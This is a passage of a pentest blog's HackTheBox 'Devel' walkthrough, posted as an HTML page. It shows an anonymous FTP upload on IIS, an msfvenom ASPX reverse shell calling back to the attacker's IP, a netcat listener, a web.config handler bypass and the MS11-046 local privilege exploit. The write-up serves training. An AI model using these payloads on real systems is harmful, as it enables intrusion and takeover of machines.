@@ -1,0 +1,657 @@
+<!DOCTYPE html>
+<html lang="en-us"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <meta name="generator" content="Hugo 0.80.0" />
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://shiny-labs.re/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://shiny-labs.re/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://shiny-labs.re/favicon-16x16.png">
+    <link rel="manifest" href="https://shiny-labs.re/site.webmanifest">
+    <link rel="mask-icon" href="https://shiny-labs.re/safari-pinned-tab.svg" color="#000000">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="theme-color" content="#ffffff">
+
+
+    <link rel="stylesheet" href="https://shiny-labs.re/css/bulma.min.css">
+    <link rel="stylesheet" href="https://shiny-labs.re/css/main.css">
+    <link rel="stylesheet" href="https://shiny-labs.re/css/syntax.css">
+
+    
+    <title>shiny-labs || HackTheBox - devel [no Metasploit]</title>
+</head>
+<body><nav class="navbar" role="navigation" aria-label="main navigation">
+    <div class="navbar-brand">
+        <a class="navbar-item no-squiggly" href="https://shiny-labs.re/">
+            <h1 id="logo" class="glitch">shiny-labs</h1>
+        </a>
+    </div>
+
+    <div class="navbar-menu">
+        <div class="navbar-start">
+            
+        </div>
+
+        <div class="navbar-end">
+            
+            <h3 id="subtitle">Exploit, reverse engineering and cats.</h3>
+        </div>
+    </div>
+</nav>
+
+<div id="content">
+
+            <div class="columns is-centered">
+                <div class="column is-three-fifths" id="menu-column"><div id="menu" class="tabs is-centered is-medium">
+    <ul>
+            <li><a href="https://shiny-labs.re/" class="no-squiggly">Home</a></li>
+            <li><a href="https://shiny-labs.re/archives/" class="no-squiggly">Archives</a></li>
+            <li><a href="https://shiny-labs.re/tags/" class="no-squiggly">Tags</a></li>
+            <li><a href="https://shiny-labs.re/about/" class="no-squiggly">About</a></li>
+  </ul>
+</div>
+
+<div class="columns">
+<div class="column is-10" id="main-column">
+    <article class="article">
+        <div >
+            <h1 class="article-title">HackTheBox - devel [no Metasploit]</h1>
+            
+<div class="post-meta">
+  <p class="article-meta">
+  <span>Date</span> &#x5b;
+  <time datetime="October 22, 2020">
+      Oct 22
+    </time>
+  &#x5d;
+        
+        
+  <span>Categories</span> &#x5b;
+    <a href="https://shiny-labs.re/categories/pentest">pentest</a>
+  &#x5d;
+        
+        
+  <span>Series</span> &#x5b;
+    <a href="https://shiny-labs.re/series/hackthebox">hackthebox</a>
+  &#x5d;
+        
+        
+  <span>Tags</span> &#x5b;
+    <a href="https://shiny-labs.re/tags/windows">windows</a>
+    <a href="https://shiny-labs.re/tags/ftp">ftp</a>
+  &#x5d;
+  </p>
+</div>
+
+        </div>
+        <div>
+            <h1 id="reconnaissance">Reconnaissance</h1>
+<p>Reconnaissance is everything in this game ~~ Let&rsquo;s run a Nmap scan and see what&rsquo;s exposed:</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">kali@kali:~$ <span class="nb">export</span> <span class="nv">TARGET</span><span class="o">=</span>10.10.10.5
+kali@kali:~$ sudo nmap -sC -sV -oA nmap_tcp -p- <span class="nv">$TARGET</span>
+</code></pre></div><p>Usual set of options:</p>
+<ul>
+<li><code>-sC</code> runs defaults Nmap scripts</li>
+<li><code>-sV</code> tries to identify the software versions</li>
+<li><code>-oA</code> will output the results in files prefixed by <code>nmap_tcp</code>  and using the formats xml, nmap and gnmap</li>
+<li><code>-p-</code> will scan all ports and not the 1000 usual ones</li>
+</ul>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">PORT   STATE SERVICE VERSION
+21/tcp open  ftp     Microsoft ftpd
+<span class="p">|</span> ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
+<span class="p">|</span> 03-18-17  02:06AM       &lt;DIR&gt;          aspnet_client
+<span class="p">|</span> 03-17-17  05:37PM                  <span class="m">689</span> iisstart.htm
+<span class="p">|</span>_03-17-17  05:37PM               <span class="m">184946</span> welcome.png
+<span class="p">|</span> ftp-syst: 
+<span class="p">|</span>_  SYST: Windows_NT
+80/tcp open  http    Microsoft IIS httpd 7.5
+<span class="p">|</span> http-methods: 
+<span class="p">|</span>_  Potentially risky methods: TRACE
+<span class="p">|</span>_http-server-header: Microsoft-IIS/7.5
+<span class="p">|</span>_http-title: IIS7
+Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 155.17 seconds
+</code></pre></div><p>I also ran a UDP scan, which turned up nothing:</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">kali@kali:~$ sudo nmap -sU -oA nmap_udp_1000 <span class="nv">$TARGET</span>
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-10-20 15:30 EDT
+Nmap scan report <span class="k">for</span> 10.10.10.5
+Host is up <span class="o">(</span>0.044s latency<span class="o">)</span>.
+All <span class="m">1000</span> scanned ports on 10.10.10.5 are open<span class="p">|</span>filtered
+
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 45.94 seconds
+</code></pre></div><ul>
+<li><code>-sU</code> for UDP scan</li>
+<li><code>-oA</code> will output the results in files prefixed by <code>nmap_udp_1000</code>  and using the formats xml, nmap and gnmap</li>
+</ul>
+<p>So in the end, we got:</p>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+<th>Version</th>
+<th>Vuln?</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>21</td>
+<td>ftp</td>
+<td>Microsoft ftpd</td>
+<td>can upload files</td>
+</tr>
+<tr>
+<td>80</td>
+<td>http</td>
+<td>Microsoft IIS httpd 7.5</td>
+<td>can exec ASP(x)</td>
+</tr>
+</tbody>
+</table>
+<p>If the Vuln column doesn&rsquo;t make any sense, it&rsquo;s because I use this table to sum up information I gather during the pentest, it will make sense when you&rsquo;re done reading the whole writeup.</p>
+<h1 id="initial-foothold">Initial Foothold</h1>
+<p>A web server huh? Let&rsquo;s try to visit that first!</p>
+<h2 id="iis-httpd-75">IIS httpd 7.5</h2>
+<p>Visiting http://10.10.10.5 ~~ What a fantastic welcome page!</p>
+<p><img src="img/image-20201020212830820.png" alt="image-20201020212830820"></p>
+<p>http://10.10.10.5/aspnet_client/system_web/2_0_50727/ =&gt; 403</p>
+<p>Run a bunch of web scanners in the background, just in case:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">kali@kali:~$ gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --url http://10.10.10.5/ -o gobuster_list-2.3-medium
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">kali@kali:~$ dirb http://10.10.10.5
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Tue Oct 20 16:22:59 2020
+URL_BASE: http://10.10.10.5/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612
+
+---- Scanning URL: http://10.10.10.5/ ----
+==&gt; DIRECTORY: http://10.10.10.5/aspnet_client/
+---- Entering directory: http://10.10.10.5/aspnet_client/ ----
+==&gt; DIRECTORY: http://10.10.10.5/aspnet_client/system_web/ 
+---- Entering directory: http://10.10.10.5/aspnet_client/system_web/ ----
+-----------------
+END_TIME: Tue Oct 20 16:34:15 2020
+DOWNLOADED: 13836 - FOUND: 0
+</code></pre></div><p>I also tried an IIS specific wordlist like <a href="https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt">https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt</a></p>
+<p>But none of the scans turned up anything interesting.</p>
+<h3 id="trace">Trace</h3>
+<p>In the meantime, let&rsquo;s have a look at that TRACE thinggy in the Nmap logs:</p>
+<blockquote>
+<p>Potentially risky methods: TRACE</p>
+</blockquote>
+<p>From <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/TRACE">https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/TRACE</a></p>
+<blockquote>
+<p>The <strong>HTTP <code>TRACE</code> method</strong> performs a message loop-back test along the path to the target resource, providing a useful debugging mechanism.</p>
+<p>The final recipient of the request should reflect the message  received, excluding some fields described below, back to the client as  the message body of a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/200"><code>200</code></a> (<code>OK</code>) response with a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Type"><code>Content-Type</code></a> of <code>message/http</code>. The final recipient is either the origin server or the first server to receive a <code>Max-Forwards</code> value of 0 in the request.</p>
+<p>Syntax</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">TRACE /index.html
+</code></pre></div></blockquote>
+<p>I modified the GET to TRACE request using Firefox developer&rsquo;s tools but we only get a 501 page saying the method is not implemented, probably a false positive from Nmap&hellip;</p>
+<p><img src="img/image-20201020215308006.png" alt="image-20201020215308006"></p>
+<p>Since I was out of ideas on the web part, I moved to the FTP. <code>Anonymous FTP login allowed</code> sounds interesting right? Let&rsquo;s go have a look at that~~</p>
+<h2 id="microsoft-ftpd">Microsoft ftpd</h2>
+<h3 id="anonymous-login">Anonymous Login</h3>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~$ ftp <span class="nv">$TARGET</span>
+Connected to 10.10.10.5.
+<span class="m">220</span> Microsoft FTP Service
+Name <span class="o">(</span>10.10.10.5:kali<span class="o">)</span>: anonymous
+<span class="m">331</span> Anonymous access allowed, send identity <span class="o">(</span>e-mail name<span class="o">)</span> as password.
+Password:
+<span class="m">230</span> User logged in.
+Remote system <span class="nb">type</span> is Windows_NT.
+ftp&gt; ls
+<span class="m">200</span> PORT <span class="nb">command</span> successful.
+<span class="m">125</span> Data connection already open<span class="p">;</span> Transfer starting.
+03-18-17  02:06AM       &lt;DIR&gt;          aspnet_client
+03-17-17  05:37PM                  <span class="m">689</span> iisstart.htm
+03-17-17  05:37PM               <span class="m">184946</span> welcome.png
+<span class="m">226</span> Transfer complete.
+</code></pre></div><p>We can retrieve <code>iisstart.htm</code> and <code>welcome.png</code>:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">ftp&gt; get welcome.png
+local: welcome.png remote: welcome.png
+<span class="m">200</span> PORT <span class="nb">command</span> successful.
+<span class="m">125</span> Data connection already open<span class="p">;</span> Transfer starting.
+WARNING! <span class="m">820</span> bare linefeeds received in ASCII mode
+File may not have transferred correctly.
+<span class="m">226</span> Transfer complete.
+<span class="m">184946</span> bytes received in 0.49 secs <span class="o">(</span>371.0533 kB/s<span class="o">)</span>
+ftp&gt; get iisstart.htm
+local: iisstart.htm remote: iisstart.htm
+<span class="m">200</span> PORT <span class="nb">command</span> successful.
+<span class="m">125</span> Data connection already open<span class="p">;</span> Transfer starting.
+<span class="m">226</span> Transfer complete.
+<span class="m">689</span> bytes received in 0.05 secs <span class="o">(</span>13.2977 kB/s<span class="o">)</span>
+</code></pre></div><p>But not <code>aspnet_client</code>:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">ftp&gt; get aspnet_client
+local: aspnet_client remote: aspnet_client
+<span class="m">200</span> PORT <span class="nb">command</span> successful.
+<span class="m">550</span> Access is denied. 
+ftp&gt; <span class="nb">cd</span> aspnet_client
+<span class="m">250</span> CWD <span class="nb">command</span> successful.
+ftp&gt; ls
+<span class="m">200</span> PORT <span class="nb">command</span> successful.
+<span class="m">125</span> Data connection already open<span class="p">;</span> Transfer starting.
+03-18-17  02:06AM       &lt;DIR&gt;          system_web
+<span class="m">226</span> Transfer complete.
+ftp&gt; <span class="nb">cd</span> system_web
+<span class="m">250</span> CWD <span class="nb">command</span> successful.
+ftp&gt; ls
+<span class="m">200</span> PORT <span class="nb">command</span> successful.
+<span class="m">125</span> Data connection already open<span class="p">;</span> Transfer starting.
+03-18-17  02:06AM       &lt;DIR&gt;          2_0_50727
+<span class="m">226</span> Transfer complete.
+ftp&gt; <span class="nb">cd</span> 2_0_50727
+<span class="m">250</span> CWD <span class="nb">command</span> successful.
+ftp&gt; ls
+<span class="m">200</span> PORT <span class="nb">command</span> successful.
+<span class="m">125</span> Data connection already open<span class="p">;</span> Transfer starting.
+<span class="m">226</span> Transfer complete.
+</code></pre></div><p><code>iisstart.htm</code> contains nothing interesting:</p>
+<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html PUBLIC &#34;-//W3C//DTD XHTML 1.0 Strict//EN&#34; &#34;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&#34;&gt;</span>
+<span class="p">&lt;</span><span class="nt">html</span> <span class="na">xmlns</span><span class="o">=</span><span class="s">&#34;http://www.w3.org/1999/xhtml&#34;</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&#34;Content-Type&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;text/html; charset=iso-8859-1&#34;</span> <span class="p">/&gt;</span>
+<span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>IIS7<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">style</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/css&#34;</span><span class="p">&gt;</span>
+<span class="o">&lt;!</span><span class="nt">--</span>
+<span class="nt">body</span> <span class="p">{</span>
+	<span class="k">color</span><span class="p">:</span><span class="mh">#000000</span><span class="p">;</span>
+	<span class="k">background-color</span><span class="p">:</span><span class="mh">#B3B3B3</span><span class="p">;</span>
+	<span class="k">margin</span><span class="p">:</span><span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="p">#</span><span class="nn">container</span> <span class="p">{</span>
+	<span class="k">margin-left</span><span class="p">:</span><span class="kc">auto</span><span class="p">;</span>
+	<span class="k">margin-right</span><span class="p">:</span><span class="kc">auto</span><span class="p">;</span>
+	<span class="k">text-align</span><span class="p">:</span><span class="kc">center</span><span class="p">;</span>
+	<span class="p">}</span>
+
+<span class="nt">a</span> <span class="nt">img</span> <span class="p">{</span>
+	<span class="k">border</span><span class="p">:</span><span class="kc">none</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="nt">--</span><span class="o">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;container&#34;</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;http://go.microsoft.com/fwlink/?linkid=66138&amp;amp;clcid=0x409&#34;</span><span class="p">&gt;&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;welcome.png&#34;</span> <span class="na">alt</span><span class="o">=</span><span class="s">&#34;IIS7&#34;</span> <span class="na">width</span><span class="o">=</span><span class="s">&#34;571&#34;</span> <span class="na">height</span><span class="o">=</span><span class="s">&#34;411&#34;</span> <span class="p">/&gt;&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</code></pre></div><p>Nor does <code>welcome.png</code>&hellip;</p>
+<p>What about that weird path <code>aspnet_client\system_web\2_0_50727</code>?</p>
+<p><img src="img/image-20201020220827789.png" alt="image-20201020220827789"></p>
+<p>Google is starting to know me a little too well&hellip; :D</p>
+<p>New piece of information, the IIS server is likely using ASP.NET 2.0 and that means it can execute ASP code. Kinda like Apache executes PHP code natively.</p>
+<p>BUT. Before we close that FTP connection, there&rsquo;s something interesting&hellip; We can write on the ftp!</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">ftp&gt; put test.txt
+local: test.txt remote: test.txt
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+226 Transfer complete.
+6 bytes sent in 0.00 secs (114.8897 kB/s)
+</code></pre></div><p>And we can access it and see the content of the file at http://10.10.10.5/test.txt</p>
+<h3 id="webconfig">web.config</h3>
+<p>Then I went poking around, looking for vulnerabilities on IIS7, I found <a href="https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/">https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/</a> which says that:</p>
+<ul>
+<li>The <code>web.config</code> file stores IIS7 settings</li>
+<li>It&rsquo;s similar to a <code>.htaccess</code> on a Apache web server</li>
+<li>Uploading a config file like <code>web.config</code> or <code>.htaccess</code> can help bypass filters on uploaded files.</li>
+</ul>
+<p>Right, let&rsquo;s try that then, I took the first example of <code>web.config</code> from the previous link. If the script works, it should return 3.</p>
+<div class="highlight"><pre class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+<span class="nt">&lt;configuration&gt;</span>
+    <span class="nt">&lt;system.web&gt;</span>
+        <span class="nt">&lt;customErrors</span> <span class="na">mode=</span><span class="s">&#34;Off&#34;</span><span class="nt">/&gt;</span>
+    <span class="nt">&lt;/system.web&gt;</span>
+   <span class="nt">&lt;system.webServer&gt;</span>
+      <span class="nt">&lt;handlers</span> <span class="na">accessPolicy=</span><span class="s">&#34;Read, Script, Write&#34;</span><span class="nt">&gt;</span>
+         <span class="nt">&lt;add</span> <span class="na">name=</span><span class="s">&#34;web_config&#34;</span> <span class="na">path=</span><span class="s">&#34;*.config&#34;</span> <span class="na">verb=</span><span class="s">&#34;*&#34;</span> <span class="na">modules=</span><span class="s">&#34;IsapiModule&#34;</span> <span class="na">scriptProcessor=</span><span class="s">&#34;%windir%\system32\inetsrv\asp.dll&#34;</span> <span class="na">resourceType=</span><span class="s">&#34;Unspecified&#34;</span> <span class="na">requireAccess=</span><span class="s">&#34;Write&#34;</span> <span class="na">preCondition=</span><span class="s">&#34;bitness64&#34;</span> <span class="nt">/&gt;</span>         
+      <span class="nt">&lt;/handlers&gt;</span>
+      <span class="nt">&lt;security&gt;</span>
+         <span class="nt">&lt;requestFiltering&gt;</span>
+            <span class="nt">&lt;fileExtensions&gt;</span>
+               <span class="nt">&lt;remove</span> <span class="na">fileExtension=</span><span class="s">&#34;.config&#34;</span> <span class="nt">/&gt;</span>
+            <span class="nt">&lt;/fileExtensions&gt;</span>
+            <span class="nt">&lt;hiddenSegments&gt;</span>
+               <span class="nt">&lt;remove</span> <span class="na">segment=</span><span class="s">&#34;web.config&#34;</span> <span class="nt">/&gt;</span>
+            <span class="nt">&lt;/hiddenSegments&gt;</span>
+         <span class="nt">&lt;/requestFiltering&gt;</span>
+      <span class="nt">&lt;/security&gt;</span>
+   <span class="nt">&lt;/system.webServer&gt;</span>
+<span class="nt">&lt;/configuration&gt;</span>
+<span class="err">&lt;</span>%
+Response.write(&#34;-&#34;<span class="err">&amp;</span>&#34;-&gt;&#34;)
+Response.write(1+2)
+Response.write(&#34;<span class="cp">&lt;!-&#34;&amp;&#34;-&#34;)
+</span><span class="cp">%&gt;</span>
+</code></pre></div><p>I uploaded it to the root ftp directory and try to visit the page, and we get an error 404:</p>
+<p><img src="img/image-20201020221617336.png" alt="image-20201020221617336"></p>
+<p>But then it hit me, why am I trying to do complicated stuff with <code>web.config</code>, maybe we can just&hellip; upload an ASP code file and it will be executed when we visit the page?</p>
+<h3 id="executing-asp-code">Executing ASP Code</h3>
+<p>Create a <code>hello.asp</code> page with:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">&lt;!doctype html&gt;
+&lt;html&gt;
+  &lt;head&gt;
+    &lt;title&gt;test&lt;/title&gt;
+  &lt;/head&gt;
+  &lt;body&gt;
+&lt;%
+  Response.Write (&#34;Hello world&#34;)
+%&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+</code></pre></div><p>Upload that on the ftp:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">ftp&gt; put hello.asp
+</code></pre></div><p>Now, let&rsquo;s visit http://10.10.10.5/hello.asp</p>
+<p><img src="img/image-20201021183335008.png" alt="image-20201021183335008"></p>
+<p>So we <em>can</em> execute ASP code! Printing Hello world is all nice and stuff. But what about a reverse shell instead?</p>
+<h3 id="generating-a-reverse-shell-with-msfvenom">Generating A Reverse Shell With msfvenom</h3>
+<p><code>msfvenom</code> can help us generate a payload that will fill our conditions.</p>
+<p>It supports a shiton of payloads/format/encoding, so let&rsquo;s filter on <code>reverse TCP windows payloads</code>:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">kali@kali:~$ msfvenom --list payloads | grep windows.*reverse_tcp
+[...] for brevity, not including all results that matches
+ windows/shell/reverse_tcp                           Spawn a piped command shell (staged). Connect back to the attacker
+    windows/shell/reverse_tcp_allports                  Spawn a piped command shell (staged). Try to connect back to the attacker, on all possible ports (1-65535, slowly)
+    windows/shell/reverse_tcp_dns                       Spawn a piped command shell (staged). Connect back to the attacker
+    windows/shell/reverse_tcp_rc4                       Spawn a piped command shell (staged). Connect back to the attacker
+    windows/shell/reverse_tcp_rc4_dns                   Spawn a piped command shell (staged). Connect back to the attacker
+    windows/shell/reverse_tcp_uuid                      Spawn a piped command shell (staged). Connect back to the attacker with UUID Support
+    windows/shell_reverse_tcp                           Connect back to attacker and spawn a command shell
+[...]
+</code></pre></div><p>Alright, let&rsquo;s go with the old-fashioned <code>windows/shell_reverse_tcp</code>!</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">kali@kali:~$ msfvenom -p windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.17 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f asp &gt; shell.asp
+No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+<span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: <span class="m">324</span> bytes
+Final size of asp file: <span class="m">38281</span> bytes
+</code></pre></div><ul>
+<li><code>-p</code> is the payload</li>
+<li><code>LHOST=</code> is the host IP (ie the IP of your kali box)</li>
+<li><code>LPORT=</code> is the host&rsquo;s port</li>
+<li><code>-f</code> indicates the format</li>
+</ul>
+<p>Next, we upload our fresh-from-the-forge <code>shell.asp</code> on the ftp:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~$ ftp <span class="nv">$TARGET</span>
+Connected to 10.10.10.5.
+<span class="m">220</span> Microsoft FTP Service
+Name <span class="o">(</span>10.10.10.5:kali<span class="o">)</span>: anonymous
+<span class="m">331</span> Anonymous access allowed, send identity <span class="o">(</span>e-mail name<span class="o">)</span> as password.
+Password:
+<span class="m">230</span> User logged in.
+Remote system <span class="nb">type</span> is Windows_NT.
+ftp&gt; put shell.asp
+local: shell.asp remote: shell.asp
+<span class="m">200</span> PORT <span class="nb">command</span> successful.
+<span class="m">125</span> Data connection already open<span class="p">;</span> Transfer starting.
+<span class="m">226</span> Transfer complete.
+<span class="m">38351</span> bytes sent in 0.00 secs <span class="o">(</span>88.7727 MB/s<span class="o">)</span>
+ftp&gt; ls
+<span class="m">200</span> PORT <span class="nb">command</span> successful.
+<span class="m">125</span> Data connection already open<span class="p">;</span> Transfer starting.
+03-18-17  02:06AM       &lt;DIR&gt;          aspnet_client
+03-17-17  05:37PM                  <span class="m">689</span> iisstart.htm
+10-25-20  03:23AM                <span class="m">38351</span> shell.asp
+03-17-17  05:37PM               <span class="m">184946</span> welcome.png
+<span class="m">226</span> Transfer complete.
+</code></pre></div><p>Next, we need to setup a listener to catch our reverse TCP shell ~~</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~$ nc -nlvp <span class="m">4444</span>
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
+</code></pre></div><p>Then visit http://10.10.10.5/shell.asp aaaaaaaand&hellip; A 500 error. Not what you expected huh? me neither!</p>
+<h3 id="a-real-shell">A Real Shell</h3>
+<p>~~ random things happen here ~~</p>
+<p>I ended up generating an <code>aspx</code> payload and it worked, no idea why <code>¯\_(ツ)_/¯</code></p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">msfvenom -p windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.17 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f aspx &gt; shell.aspx
+</code></pre></div><p>But we have a shell!</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">kali@kali:~$ nc -nlvp <span class="m">4444</span>
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
+connect to <span class="o">[</span>10.10.14.17<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.5<span class="o">]</span> <span class="m">49158</span>
+Microsoft Windows <span class="o">[</span>Version 6.1.7600<span class="o">]</span>
+Copyright <span class="o">(</span>c<span class="o">)</span> <span class="m">2009</span> Microsoft Corporation.  All rights reserved.
+
+c:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;whoami
+whoami
+iis apppool<span class="se">\w</span>eb
+c:<span class="se">\U</span>sers&gt;cd babis
+<span class="nb">cd</span> babis
+Access is denied.
+</code></pre></div><p>I guess <code>iis apppool\web</code> doesn&rsquo;t have access to much besides the webserver, no user.txt for us :(( It&rsquo;s not an interesting shell yet&hellip;</p>
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<p>Time for some Windows recon!</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">c:\Users&gt;systeminfo
+systeminfo
+
+Host Name:                 DEVEL
+OS Name:                   Microsoft Windows 7 Enterprise 
+OS Version:                6.1.7600 N/A Build 7600
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Workstation
+OS Build Type:             Multiprocessor Free
+Registered Owner:          babis
+Registered Organization:   
+Product ID:                55041-051-0948536-86302
+Original Install Date:     17/3/2017, 4:17:31 ��
+System Boot Time:          24/10/2020, 6:19:52 ��
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               X86-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
+BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             el;Greek
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
+Total Physical Memory:     1.023 MB
+Available Physical Memory: 708 MB
+Virtual Memory: Max Size:  2.047 MB
+Virtual Memory: Available: 1.524 MB
+Virtual Memory: In Use:    523 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    HTB
+Logon Server:              N/A
+Hotfix(s):                 N/A
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: Intel(R) PRO/1000 MT Network Connection
+                                 Connection Name: Local Area Connection
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 10.10.10.5
+</code></pre></div><p>So, a x86 Microsoft Windows 7 Enterprise, version 6.1.7600 N/A Build 7600. What can we do with that?</p>
+<p>Let&rsquo;s ask our favorite search engine:</p>
+<p><img src="img/image-20201022094547068.png" alt="image-20201022094547068"></p>
+<p>The first link is <a href="https://www.exploit-db.com/exploits/40564,">https://www.exploit-db.com/exploits/40564,</a></p>
+<p>Retrieve the exploit with <code>searchsploit</code> (or download the file from exploit-db):</p>
+<p><img src="img/image-20201022095538343.png" alt="image-20201022095538343"></p>
+<p>The <code>-m</code> option (for mirror) can download an exploit given a EDB-ID for example:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">kali@kali:~$ searchsploit -m 40564
+  Exploit: Microsoft Windows (x86) - &#39;afd.sys&#39; Local Privilege Escalation (MS11-046)
+      URL: https://www.exploit-db.com/exploits/40564
+     Path: /usr/share/exploitdb/exploits/windows_x86/local/40564.c
+File Type: C source, ASCII text, with CRLF line terminators
+
+Copied to: /home/kali/40564.c
+</code></pre></div><p>Now, how do we compile this thing for Windows on a Linux?</p>
+<h2 id="cross-compiling-an-exploit">Cross-Compiling An Exploit</h2>
+<p>We got compiling instructions in the comments of the <code>40564.c</code> file:</p>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="cp"># Exploit notes:
+</span><span class="cp">#   Privileged shell execution:
+</span><span class="cp">#     - the SYSTEM shell will spawn within the invoking shell/process
+</span><span class="cp">#   Exploit compiling (Kali GNU/Linux Rolling 64-bit):
+</span><span class="cp">#     - # i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32
+</span></code></pre></div><p>MinGW is an open source compiler suite that allow you to build Windows binaries from a Linux box.</p>
